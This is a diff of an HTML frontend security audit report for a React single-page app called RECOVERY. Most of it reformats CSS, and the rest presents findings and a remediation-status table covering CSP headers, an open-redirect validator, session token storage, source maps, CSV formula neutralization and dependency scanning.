@@ -18,10 +18,12 @@
     --info: #64748b;
     --good: #15803d;
     --good-soft: #eaf5ee;
-    --mono: ui-monospace, "SFMono-Regular", "Menlo", "Consolas", monospace;
-    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    --mono: ui-monospace, 'SFMono-Regular', 'Menlo', 'Consolas', monospace;
+    --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
   }
-  * { box-sizing: border-box; }
+  * {
+    box-sizing: border-box;
+  }
   body {
     margin: 0;
     background: var(--bg);
@@ -30,7 +32,11 @@
     line-height: 1.6;
     -webkit-font-smoothing: antialiased;
   }
-  .wrap { max-width: 1020px; margin: 0 auto; padding: 0 20px 96px; }
+  .wrap {
+    max-width: 1020px;
+    margin: 0 auto;
+    padding: 0 20px 96px;
+  }
 
   /* ---- Masthead ---- */
   .mast {
@@ -43,7 +49,7 @@
   .mast .eyebrow {
     font-family: var(--mono);
     font-size: 12px;
-    letter-spacing: .22em;
+    letter-spacing: 0.22em;
     text-transform: uppercase;
     color: #a9b6d4;
     margin: 0 0 14px;
@@ -53,25 +59,51 @@
     line-height: 1.1;
     margin: 0 0 8px;
     font-weight: 700;
-    letter-spacing: -.015em;
+    letter-spacing: -0.015em;
     text-wrap: balance;
   }
-  .mast .sub { color: #c3cce0; font-size: 15px; margin: 0 0 26px; max-width: 60ch; }
+  .mast .sub {
+    color: #c3cce0;
+    font-size: 15px;
+    margin: 0 0 26px;
+    max-width: 60ch;
+  }
   .mast-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
     gap: 14px;
   }
   .mcell {
-    background: rgba(255,255,255,.06);
-    border: 1px solid rgba(255,255,255,.12);
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid rgba(255, 255, 255, 0.12);
     border-radius: 11px;
     padding: 13px 15px;
   }
-  .mcell .k { font-family: var(--mono); font-size: 10.5px; letter-spacing: .16em; text-transform: uppercase; color: #9fabc9; margin-bottom: 5px; }
-  .mcell .v { font-size: 15px; font-weight: 600; color: #f2f5fb; }
-  .verdict-badge { display:inline-flex; align-items:center; gap:8px; font-weight:700; }
-  .dot { width:9px; height:9px; border-radius:50%; display:inline-block; }
+  .mcell .k {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.16em;
+    text-transform: uppercase;
+    color: #9fabc9;
+    margin-bottom: 5px;
+  }
+  .mcell .v {
+    font-size: 15px;
+    font-weight: 600;
+    color: #f2f5fb;
+  }
+  .verdict-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 700;
+  }
+  .dot {
+    width: 9px;
+    height: 9px;
+    border-radius: 50%;
+    display: inline-block;
+  }
 
   /* ---- Score ring row ---- */
   .scoreband {
@@ -85,62 +117,212 @@
     padding: 26px 28px;
     margin-bottom: 30px;
   }
-  .ring { position: relative; width: 160px; height: 160px; margin: 0 auto; }
-  .ring svg { transform: rotate(-90deg); }
-  .ring .num { position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; }
-  .ring .num b { font-size: 40px; font-weight: 750; letter-spacing:-.02em; line-height:1; }
-  .ring .num span { font-size: 11px; color: var(--muted); font-family: var(--mono); letter-spacing:.12em; text-transform:uppercase; margin-top:4px; }
-  .tallies { display: grid; grid-template-columns: repeat(auto-fit,minmax(88px,1fr)); gap: 10px; }
-  .tally { border:1px solid var(--line); border-radius: 11px; padding: 12px 10px; text-align:center; background:#fbfcfe; }
-  .tally b { display:block; font-size: 26px; font-weight: 720; line-height:1; font-variant-numeric: tabular-nums; }
-  .tally span { font-size: 11px; color: var(--muted); font-family: var(--mono); letter-spacing:.09em; text-transform:uppercase; }
+  .ring {
+    position: relative;
+    width: 160px;
+    height: 160px;
+    margin: 0 auto;
+  }
+  .ring svg {
+    transform: rotate(-90deg);
+  }
+  .ring .num {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+  .ring .num b {
+    font-size: 40px;
+    font-weight: 750;
+    letter-spacing: -0.02em;
+    line-height: 1;
+  }
+  .ring .num span {
+    font-size: 11px;
+    color: var(--muted);
+    font-family: var(--mono);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-top: 4px;
+  }
+  .tallies {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(88px, 1fr));
+    gap: 10px;
+  }
+  .tally {
+    border: 1px solid var(--line);
+    border-radius: 11px;
+    padding: 12px 10px;
+    text-align: center;
+    background: #fbfcfe;
+  }
+  .tally b {
+    display: block;
+    font-size: 26px;
+    font-weight: 720;
+    line-height: 1;
+    font-variant-numeric: tabular-nums;
+  }
+  .tally span {
+    font-size: 11px;
+    color: var(--muted);
+    font-family: var(--mono);
+    letter-spacing: 0.09em;
+    text-transform: uppercase;
+  }
 
   /* ---- Sections ---- */
-  section { margin-bottom: 40px; }
+  section {
+    margin-bottom: 40px;
+  }
   h2.sh {
     font-size: 13px;
     font-family: var(--mono);
-    letter-spacing: .18em;
+    letter-spacing: 0.18em;
     text-transform: uppercase;
     color: var(--accent);
     border-bottom: 2px solid var(--line);
     padding-bottom: 9px;
     margin: 0 0 20px;
   }
-  h2.sh .idx { color: var(--muted); margin-right: 10px; }
-  p.lead { font-size: 15.5px; color: var(--ink-soft); margin: 0 0 14px; }
+  h2.sh .idx {
+    color: var(--muted);
+    margin-right: 10px;
+  }
+  p.lead {
+    font-size: 15.5px;
+    color: var(--ink-soft);
+    margin: 0 0 14px;
+  }
   .card {
     background: var(--paper);
     border: 1px solid var(--line);
     border-radius: 13px;
     padding: 22px 24px;
   }
-  .card + .card { margin-top: 14px; }
+  .card + .card {
+    margin-top: 14px;
+  }
 
   /* ---- Category scores ---- */
-  .cat { display:grid; grid-template-columns: 210px 1fr 48px; align-items:center; gap:14px; padding: 9px 0; border-bottom:1px solid var(--line-soft); }
-  .cat:last-child { border-bottom:0; }
-  .cat .name { font-size: 14px; font-weight:600; }
-  .cat .bar { height: 9px; background: var(--line-soft); border-radius: 6px; overflow:hidden; }
-  .cat .bar i { display:block; height:100%; border-radius:6px; }
-  .cat .pct { font-family: var(--mono); font-size:13px; font-weight:600; text-align:right; font-variant-numeric: tabular-nums; }
+  .cat {
+    display: grid;
+    grid-template-columns: 210px 1fr 48px;
+    align-items: center;
+    gap: 14px;
+    padding: 9px 0;
+    border-bottom: 1px solid var(--line-soft);
+  }
+  .cat:last-child {
+    border-bottom: 0;
+  }
+  .cat .name {
+    font-size: 14px;
+    font-weight: 600;
+  }
+  .cat .bar {
+    height: 9px;
+    background: var(--line-soft);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  .cat .bar i {
+    display: block;
+    height: 100%;
+    border-radius: 6px;
+  }
+  .cat .pct {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    text-align: right;
+    font-variant-numeric: tabular-nums;
+  }
 
   /* ---- Heatmap ---- */
-  .heat-wrap { overflow-x:auto; }
-  table.heat { border-collapse: collapse; width:100%; font-size: 13px; min-width: 560px; }
-  table.heat th, table.heat td { border:1px solid var(--line); padding: 8px 10px; text-align:center; }
-  table.heat th { background: #f4f6fa; font-family:var(--mono); font-size:11px; letter-spacing:.06em; text-transform:uppercase; color:var(--ink-soft); font-weight:600; }
-  table.heat td.mod { text-align:left; font-weight:600; background:#fbfcfe; }
-  .cellv { display:inline-flex; min-width:22px; height:22px; align-items:center; justify-content:center; border-radius:6px; font-family:var(--mono); font-weight:700; font-size:12px; color:#fff; }
+  .heat-wrap {
+    overflow-x: auto;
+  }
+  table.heat {
+    border-collapse: collapse;
+    width: 100%;
+    font-size: 13px;
+    min-width: 560px;
+  }
+  table.heat th,
+  table.heat td {
+    border: 1px solid var(--line);
+    padding: 8px 10px;
+    text-align: center;
+  }
+  table.heat th {
+    background: #f4f6fa;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    font-weight: 600;
+  }
+  table.heat td.mod {
+    text-align: left;
+    font-weight: 600;
+    background: #fbfcfe;
+  }
+  .cellv {
+    display: inline-flex;
+    min-width: 22px;
+    height: 22px;
+    align-items: center;
+    justify-content: center;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-weight: 700;
+    font-size: 12px;
+    color: #fff;
+  }
 
   /* ---- Chips ---- */
-  .chip { display:inline-flex; align-items:center; gap:6px; font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:.05em; text-transform:uppercase; padding:3px 9px; border-radius:999px; }
-  .chip.crit { background:#f7e5e5; color:var(--crit); }
-  .chip.high { background:#fbe7da; color:var(--high); }
-  .chip.med  { background:#f8eeda; color:var(--med); }
-  .chip.low  { background:#dcf0f4; color:var(--low); }
-  .chip.info { background:#e9edf2; color:var(--info); }
-  .chip.good { background:var(--good-soft); color:var(--good); }
+  .chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    padding: 3px 9px;
+    border-radius: 999px;
+  }
+  .chip.crit {
+    background: #f7e5e5;
+    color: var(--crit);
+  }
+  .chip.high {
+    background: #fbe7da;
+    color: var(--high);
+  }
+  .chip.med {
+    background: #f8eeda;
+    color: var(--med);
+  }
+  .chip.low {
+    background: #dcf0f4;
+    color: var(--low);
+  }
+  .chip.info {
+    background: #e9edf2;
+    color: var(--info);
+  }
+  .chip.good {
+    background: var(--good-soft);
+    color: var(--good);
+  }
 
   /* ---- Finding cards ---- */
   .finding {
@@ -151,97 +333,337 @@
     padding: 20px 22px;
     margin-bottom: 15px;
   }
-  .finding.crit { border-left-color: var(--crit); }
-  .finding.high { border-left-color: var(--high); }
-  .finding.med  { border-left-color: var(--med); }
-  .finding.low  { border-left-color: var(--low); }
-  .finding.info { border-left-color: var(--info); }
-  .finding.good { border-left-color: var(--good); }
-  .fhead { display:flex; flex-wrap:wrap; align-items:center; gap:10px; margin-bottom:6px; }
-  .fid { font-family:var(--mono); font-weight:700; font-size:13px; color:var(--accent); }
-  .ftitle { font-size:17px; font-weight:680; margin:2px 0 12px; letter-spacing:-.01em; }
-  .fmeta { display:flex; flex-wrap:wrap; gap:6px 8px; margin-bottom:14px; }
-  .tag { font-family:var(--mono); font-size:11px; color:var(--ink-soft); background:#f2f4f8; border:1px solid var(--line); border-radius:6px; padding:2px 8px; }
-  .tag b { color:var(--ink); font-weight:700; }
-  .frow { margin: 10px 0; }
-  .frow .lbl { font-family:var(--mono); font-size:11px; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:3px; }
-  .frow p { margin:0; font-size:14.5px; color:var(--ink-soft); }
-  .path { font-family:var(--mono); font-size:12.5px; background:#f4f6fa; border:1px solid var(--line); border-radius:5px; padding:1px 6px; color:var(--accent); word-break:break-all; }
-  pre.code { background:#161a22; color:#dfe6f2; border-radius:9px; padding:13px 15px; overflow-x:auto; font-family:var(--mono); font-size:12.5px; line-height:1.55; margin:8px 0 0; }
-  pre.code .cm { color:#8a93a6; }
-  pre.code .bad { color:#f0a3a3; }
-  .refs { display:grid; grid-template-columns:1fr 1fr; gap:10px 20px; margin-top:12px; padding-top:12px; border-top:1px dashed var(--line); }
-  .refs .lbl { font-family:var(--mono); font-size:10.5px; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); }
-  .refs p { margin:2px 0 0; font-size:13px; color:var(--ink-soft); }
-  .rec { background:var(--accent-soft); border:1px solid #d9e0ee; border-radius:9px; padding:12px 15px; margin-top:12px; }
-  .rec .lbl { font-family:var(--mono); font-size:10.5px; letter-spacing:.1em; text-transform:uppercase; color:var(--accent); margin-bottom:4px; }
-  .rec p { margin:0; font-size:14px; color:var(--ink-soft); }
+  .finding.crit {
+    border-left-color: var(--crit);
+  }
+  .finding.high {
+    border-left-color: var(--high);
+  }
+  .finding.med {
+    border-left-color: var(--med);
+  }
+  .finding.low {
+    border-left-color: var(--low);
+  }
+  .finding.info {
+    border-left-color: var(--info);
+  }
+  .finding.good {
+    border-left-color: var(--good);
+  }
+  .fhead {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 6px;
+  }
+  .fid {
+    font-family: var(--mono);
+    font-weight: 700;
+    font-size: 13px;
+    color: var(--accent);
+  }
+  .ftitle {
+    font-size: 17px;
+    font-weight: 680;
+    margin: 2px 0 12px;
+    letter-spacing: -0.01em;
+  }
+  .fmeta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 8px;
+    margin-bottom: 14px;
+  }
+  .tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--ink-soft);
+    background: #f2f4f8;
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    padding: 2px 8px;
+  }
+  .tag b {
+    color: var(--ink);
+    font-weight: 700;
+  }
+  .frow {
+    margin: 10px 0;
+  }
+  .frow .lbl {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 3px;
+  }
+  .frow p {
+    margin: 0;
+    font-size: 14.5px;
+    color: var(--ink-soft);
+  }
+  .path {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    background: #f4f6fa;
+    border: 1px solid var(--line);
+    border-radius: 5px;
+    padding: 1px 6px;
+    color: var(--accent);
+    word-break: break-all;
+  }
+  pre.code {
+    background: #161a22;
+    color: #dfe6f2;
+    border-radius: 9px;
+    padding: 13px 15px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    margin: 8px 0 0;
+  }
+  pre.code .cm {
+    color: #8a93a6;
+  }
+  pre.code .bad {
+    color: #f0a3a3;
+  }
+  .refs {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px 20px;
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px dashed var(--line);
+  }
+  .refs .lbl {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+  .refs p {
+    margin: 2px 0 0;
+    font-size: 13px;
+    color: var(--ink-soft);
+  }
+  .rec {
+    background: var(--accent-soft);
+    border: 1px solid #d9e0ee;
+    border-radius: 9px;
+    padding: 12px 15px;
+    margin-top: 12px;
+  }
+  .rec .lbl {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 4px;
+  }
+  .rec p {
+    margin: 0;
+    font-size: 14px;
+    color: var(--ink-soft);
+  }
 
-  ul.clean { margin:0; padding-left:0; list-style:none; }
-  ul.clean li { position:relative; padding-left:24px; margin-bottom:11px; font-size:14.5px; color:var(--ink-soft); }
-  ul.clean li::before { content:""; position:absolute; left:6px; top:9px; width:7px; height:7px; border-radius:2px; background:var(--accent); }
-  ul.clean li b { color:var(--ink); }
+  ul.clean {
+    margin: 0;
+    padding-left: 0;
+    list-style: none;
+  }
+  ul.clean li {
+    position: relative;
+    padding-left: 24px;
+    margin-bottom: 11px;
+    font-size: 14.5px;
+    color: var(--ink-soft);
+  }
+  ul.clean li::before {
+    content: '';
+    position: absolute;
+    left: 6px;
+    top: 9px;
+    width: 7px;
+    height: 7px;
+    border-radius: 2px;
+    background: var(--accent);
+  }
+  ul.clean li b {
+    color: var(--ink);
+  }
 
-  .two { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
-  @media (max-width:760px){ .scoreband{grid-template-columns:1fr;} .refs{grid-template-columns:1fr;} .two{grid-template-columns:1fr;} .cat{grid-template-columns:120px 1fr 42px;} }
-  footer { text-align:center; color:var(--muted); font-size:12.5px; font-family:var(--mono); padding-top:24px; border-top:1px solid var(--line); }
+  .two {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+  @media (max-width: 760px) {
+    .scoreband {
+      grid-template-columns: 1fr;
+    }
+    .refs {
+      grid-template-columns: 1fr;
+    }
+    .two {
+      grid-template-columns: 1fr;
+    }
+    .cat {
+      grid-template-columns: 120px 1fr 42px;
+    }
+  }
+  footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 12.5px;
+    font-family: var(--mono);
+    padding-top: 24px;
+    border-top: 1px solid var(--line);
+  }
 
   /* Remediation status chips + banner (added 22 Jul 2026 remediation pass) */
-  .chip.st { font-weight:700; }
-  .chip.st-fixed   { background:#e4f3e8; color:#2f8f46; }
-  .chip.st-mitig   { background:#e2f2f1; color:#1f8a80; }
-  .chip.st-handoff { background:#e9ecfb; color:#42499c; }
-  .chip.st-defer   { background:#fbf0dc; color:#9a6b1c; }
-  .chip.st-partial { background:#f3f0dc; color:#7f7a1c; }
-  .chip.st-none    { background:#eceef2; color:#5a6478; }
-  .rembanner { border-left:5px solid #2f8f46; }
-  table.remt { width:100%; border-collapse:collapse; font-size:13.5px; }
-  table.remt th, table.remt td { text-align:left; padding:9px 10px; border-bottom:1px solid var(--line); vertical-align:top; }
-  table.remt th { font-family:var(--mono); font-size:10.5px; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); }
-  table.remt td.id { font-family:var(--mono); font-weight:700; white-space:nowrap; color:var(--ink); }
-  table.remt td b { color:var(--ink); }
-  .remt-wrap { overflow-x:auto; }
-  .sthru { text-decoration:line-through; opacity:.6; }
+  .chip.st {
+    font-weight: 700;
+  }
+  .chip.st-fixed {
+    background: #e4f3e8;
+    color: #2f8f46;
+  }
+  .chip.st-mitig {
+    background: #e2f2f1;
+    color: #1f8a80;
+  }
+  .chip.st-handoff {
+    background: #e9ecfb;
+    color: #42499c;
+  }
+  .chip.st-defer {
+    background: #fbf0dc;
+    color: #9a6b1c;
+  }
+  .chip.st-partial {
+    background: #f3f0dc;
+    color: #7f7a1c;
+  }
+  .chip.st-none {
+    background: #eceef2;
+    color: #5a6478;
+  }
+  .rembanner {
+    border-left: 5px solid #2f8f46;
+  }
+  table.remt {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13.5px;
+  }
+  table.remt th,
+  table.remt td {
+    text-align: left;
+    padding: 9px 10px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: top;
+  }
+  table.remt th {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+  table.remt td.id {
+    font-family: var(--mono);
+    font-weight: 700;
+    white-space: nowrap;
+    color: var(--ink);
+  }
+  table.remt td b {
+    color: var(--ink);
+  }
+  .remt-wrap {
+    overflow-x: auto;
+  }
+  .sthru {
+    text-decoration: line-through;
+    opacity: 0.6;
+  }
 </style>
 
 <div class="mast">
   <p class="eyebrow">Pre-Penetration-Test Static Security Review · OWASP + ISO 27001/27002</p>
   <h1>RECOVERY Platform — Frontend Security Audit</h1>
-  <p class="sub">Deep static source-code assessment of the RECOVERY tenant frontend (Create React App / CRACO single-page app). Backend (<span style="font-family:var(--mono)">trade-harmonizer-be</span>, NestJS) treated as read-only and already assessed in a prior engagement.</p>
+  <p class="sub">
+    Deep static source-code assessment of the RECOVERY tenant frontend (Create React App / CRACO
+    single-page app). Backend (<span style="font-family: var(--mono)">trade-harmonizer-be</span>,
+    NestJS) treated as read-only and already assessed in a prior engagement.
+  </p>
   <div class="mast-grid">
-    <div class="mcell"><div class="k">Scope</div><div class="v">RECOVERY /src · 176 files · ~15.1k LOC</div></div>
-    <div class="mcell"><div class="k">Stack</div><div class="v">React 18 · CRA 5 · RTK Query · Router 6</div></div>
-    <div class="mcell"><div class="k">Branch</div><div class="v">security-improvements</div></div>
-    <div class="mcell"><div class="k">Date</div><div class="v">22 Jul 2026</div></div>
-    <div class="mcell"><div class="k">Verdict</div><div class="v verdict-badge"><span class="dot" style="background:#4d9a5a"></span> Remediated — pending deploy check</div></div>
+    <div class="mcell">
+      <div class="k">Scope</div>
+      <div class="v">RECOVERY /src · 176 files · ~15.1k LOC</div>
+    </div>
+    <div class="mcell">
+      <div class="k">Stack</div>
+      <div class="v">React 18 · CRA 5 · RTK Query · Router 6</div>
+    </div>
+    <div class="mcell">
+      <div class="k">Branch</div>
+      <div class="v">security-improvements</div>
+    </div>
+    <div class="mcell">
+      <div class="k">Date</div>
+      <div class="v">22 Jul 2026</div>
+    </div>
+    <div class="mcell">
+      <div class="k">Verdict</div>
+      <div class="v verdict-badge">
+        <span class="dot" style="background: #4d9a5a"></span> Remediated — pending deploy check
+      </div>
+    </div>
   </div>
 </div>
 
 <div class="wrap">
-
   <!-- SCORE BAND -->
   <div class="scoreband">
     <div class="ring">
       <svg width="160" height="160" viewBox="0 0 160 160">
-        <circle cx="80" cy="80" r="70" fill="none" stroke="#e7eaf1" stroke-width="14"/>
-        <circle cx="80" cy="80" r="70" fill="none" stroke="#4d9a5a" stroke-width="14" stroke-linecap="round"
-          stroke-dasharray="439.8" stroke-dashoffset="52.8"/>
+        <circle cx="80" cy="80" r="70" fill="none" stroke="#e7eaf1" stroke-width="14" />
+        <circle
+          cx="80"
+          cy="80"
+          r="70"
+          fill="none"
+          stroke="#4d9a5a"
+          stroke-width="14"
+          stroke-linecap="round"
+          stroke-dasharray="439.8"
+          stroke-dashoffset="52.8"
+        />
       </svg>
       <div class="num"><b>88</b><span>of 100</span></div>
     </div>
     <div>
       <div class="tallies">
-        <div class="tally"><b style="color:var(--crit)">0</b><span>Critical</span></div>
-        <div class="tally"><b style="color:var(--high)">3</b><span>High</span></div>
-        <div class="tally"><b style="color:var(--med)">5</b><span>Medium</span></div>
-        <div class="tally"><b style="color:var(--low)">6</b><span>Low</span></div>
-        <div class="tally"><b style="color:var(--info)">3</b><span>Info</span></div>
+        <div class="tally"><b style="color: var(--crit)">0</b><span>Critical</span></div>
+        <div class="tally"><b style="color: var(--high)">3</b><span>High</span></div>
+        <div class="tally"><b style="color: var(--med)">5</b><span>Medium</span></div>
+        <div class="tally"><b style="color: var(--low)">6</b><span>Low</span></div>
+        <div class="tally"><b style="color: var(--info)">3</b><span>Info</span></div>
       </div>
-      <p style="margin:16px 0 0;font-size:14px;color:var(--ink-soft)">
-        No Critical findings. The codebase is meaningfully hardened versus the original trade-harmonizer baseline
-        (session tokens off <span class="path">localStorage</span>, <span class="path">no-console</span> enforced,
-        no dangerous HTML sinks). Three High items — <b>missing security headers/CSP</b>, an <b>open redirect</b>,
-        and <b>tokens in JS-readable storage</b> — plus production source maps should be closed before an external pentest.
+      <p style="margin: 16px 0 0; font-size: 14px; color: var(--ink-soft)">
+        No Critical findings. The codebase is meaningfully hardened versus the original
+        trade-harmonizer baseline (session tokens off <span class="path">localStorage</span>,
+        <span class="path">no-console</span> enforced, no dangerous HTML sinks). Three High items —
+        <b>missing security headers/CSP</b>, an <b>open redirect</b>, and
+        <b>tokens in JS-readable storage</b> — plus production source maps should be closed before
+        an external pentest.
       </p>
     </div>
   </div>
@@ -250,36 +672,233 @@
   <section>
     <h2 class="sh"><span class="idx">★</span>Remediation Status — 22 Jul 2026</h2>
     <div class="card rembanner">
-      <p class="lead" style="margin-top:0">A remediation pass was executed against this report on the <span class="path">security-improvements</span> branch,
-      sequentially and with every repo gate re-run after the changes. <b>12 of 15 findings are Fixed or already mitigated;</b>
-      the remaining three are documented backend handoffs or accepted residuals — none were closed by guesswork.
-      All local gates pass: <b>ESLint 0 warnings · tsc strict clean · 62/62 tests (17 suites) · no circular deps · production build green · Trivy 0 CRITICAL</b>.</p>
-      <p style="margin:0 0 14px;font-size:13.5px;color:var(--ink-soft)"><b>Deploy-verify caveat:</b> HDR-001 (headers/CSP via
-      <span class="path">customHttp.yml</span>) and SUP-001 (<span class="path">amplify.yml</span> scan steps) cannot be confirmed locally —
-      Amplify only applies them on a deployed environment. Both must be confirmed on an Amplify <b>preview deploy</b> (live headers present,
-      zero CSP-violation console errors) before the pentest. The score below assumes they land as written.</p>
+      <p class="lead" style="margin-top: 0">
+        A remediation pass was executed against this report on the
+        <span class="path">security-improvements</span> branch, sequentially and with every repo
+        gate re-run after the changes. <b>12 of 15 findings are Fixed or already mitigated;</b> the
+        remaining three are documented backend handoffs or accepted residuals — none were closed by
+        guesswork. All local gates pass:
+        <b
+          >ESLint 0 warnings · tsc strict clean · 62/62 tests (17 suites) · no circular deps ·
+          production build green · Trivy 0 CRITICAL</b
+        >.
+      </p>
+      <p style="margin: 0 0 14px; font-size: 13.5px; color: var(--ink-soft)">
+        <b>Deploy-verify caveat:</b> HDR-001 (headers/CSP via
+        <span class="path">customHttp.yml</span>) and SUP-001 (<span class="path">amplify.yml</span>
+        scan steps) cannot be confirmed locally — Amplify only applies them on a deployed
+        environment. Both must be confirmed on an Amplify <b>preview deploy</b> (live headers
+        present, zero CSP-violation console errors) before the pentest. The score below assumes they
+        land as written.
+      </p>
       <div class="remt-wrap">
-      <table class="remt">
-        <thead><tr><th>ID</th><th>Sev</th><th>Status</th><th>What changed &amp; how it was verified</th></tr></thead>
-        <tbody>
-          <tr><td class="id">HDR-001</td><td>High</td><td><span class="chip st st-fixed">Fixed*</span></td><td>New <span class="path">customHttp.yml</span> — HSTS, X-Frame-Options DENY, nosniff, Referrer-Policy, Permissions-Policy, and a strict CSP (<span class="path">default-src 'self'; script-src 'self'; frame-ancestors 'none'</span>; font/style origins pinned to Google Fonts). YAML validated; build green. <b>*live headers pending preview deploy.</b></td></tr>
-          <tr><td class="id">RED-001</td><td>High</td><td><span class="chip st st-fixed">Fixed</span></td><td>New <span class="path">src/lib/safe-redirect.ts</span> <span class="path">isAllowedRedirectUrl</span> (https + <span class="path">.tradeharmonizer.co.uk</span> suffix, http localhost only) applied in both <span class="path">pages/auth/InvalidSubdomainPage.tsx</span> and the duplicate <span class="path">components/tenant/InvalidSubdomainPage.tsx</span>. 11-case test proves <span class="path">javascript:</span>/<span class="path">data:</span>/foreign hosts fall back to the main site. Both sinks now use the sanitized value.</td></tr>
-          <tr><td class="id">SES-001</td><td>High</td><td><span class="chip st st-handoff">Backend handoff</span></td><td><b>Verified read-only:</b> the recovery auth module uses <b>no cookies at all</b> — login and <span class="path">/recovery/auth/refresh</span> both carry tokens in the request body. The frontend cannot move to HttpOnly cookies unilaterally. Kept the tab-scoped + 12h-expiry sessionStorage envelope; the enforced CSP (HDR-001) is now the compensating control. <b>Handoff:</b> backend must set an HttpOnly refresh cookie on <span class="path">/recovery/auth/*</span>.</td></tr>
-          <tr><td class="id">INFO-001</td><td>Med</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">build</span> script now runs <span class="path">cross-env GENERATE_SOURCEMAP=false INLINE_RUNTIME_CHUNK=false craco build</span>. Verified: post-build <span class="path">.map</span> count = <b>0</b> (was 4).</td></tr>
-          <tr><td class="id">CSV-001</td><td>Med</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">neutralizeFormula</span> added to <span class="path">src/lib/csv.ts</span> (prefixes <span class="path">= + - @ \t \r</span> cells with <span class="path">'</span>) and reused in the landed-cost export's <span class="path">csvData</span>. RFC-4180 quoting untouched. New <span class="path">csv.test.ts</span> covers formula + quoting cases.</td></tr>
-          <tr><td class="id">API-001</td><td>Med</td><td><span class="chip st st-mitig">Already mitigated</span></td><td><b>Verified read-only:</b> the backend loads the record by id then <span class="path">resolveDownloadTargetFromCombinedRecord</span> rejects any client <span class="path">s3Key</span> not belonging to that record (<span class="path">"Requested file key is not part of this recovery record"</span>) and takes the bucket from the matched target. The <span class="path">s3Key</span> selects which file — removing it would break downloads, so the frontend is left unchanged.</td></tr>
-          <tr><td class="id">DEP-001</td><td>Med</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">npm audit fix</span> (non-breaking) resolved the 1 CRITICAL (<span class="path">websocket-driver</span> 0.7.4→0.7.5); vulnerabilities 27→9. Trivy now reports 0 CRITICAL. Residual 9 (moderate/high) are all dev/build-chain (<span class="path">webpack-dev-server</span>/<span class="path">sockjs</span>/<span class="path">uuid</span>/<span class="path">react-scripts</span>), not shipped — accepted; durable fix = migrate to Vite. <span class="path">--force</span> deliberately avoided.</td></tr>
-          <tr><td class="id">SUP-001</td><td>Med</td><td><span class="chip st st-fixed">Fixed*</span></td><td><span class="path">amplify.yml</span>: Trivy installer pinned to <span class="path">v0.71.1</span> (was mutable <span class="path">main</span>; URL verified 200 and matches the locally validated version) + non-blocking <span class="path">npm run security:audit</span> and <span class="path">trivy fs</span> scan steps added to the build phase. YAML validated. <b>*pipeline behavior pending Amplify build.</b></td></tr>
-          <tr><td class="id">SES-002</td><td>Low</td><td><span class="chip st st-defer">Deferred · handoff</span></td><td><b>Verified:</b> backend <span class="path">setup-password</span> requires the raw <span class="path">temporaryPassword</span> (re-validated vs the stored hash) alongside the setup token, and the multi-step OTP flow persists it to sessionStorage to survive page reloads. Navigation-state-only would break reload resilience. Left as-is to avoid breaking onboarding; <b>handoff:</b> backend should accept the setup token alone at setup-password.</td></tr>
-          <tr><td class="id">UPLOAD-001</td><td>Low</td><td><span class="chip st st-fixed">Fixed</span></td><td><span class="path">upload-c88-document-modal.tsx</span>: fail-fast 10 MB size ceiling + <span class="path">%PDF-</span> magic-byte check before the mutation (backend remains authoritative). Mutation contract unchanged.</td></tr>
-          <tr><td class="id">HYG-001</td><td>Low</td><td><span class="chip st st-fixed">Fixed</span></td><td>Grep-confirmed zero importers, then deleted <span class="path">src/config/auth.ts</span> (hardcoded demo creds). Typecheck + build clean with it gone.</td></tr>
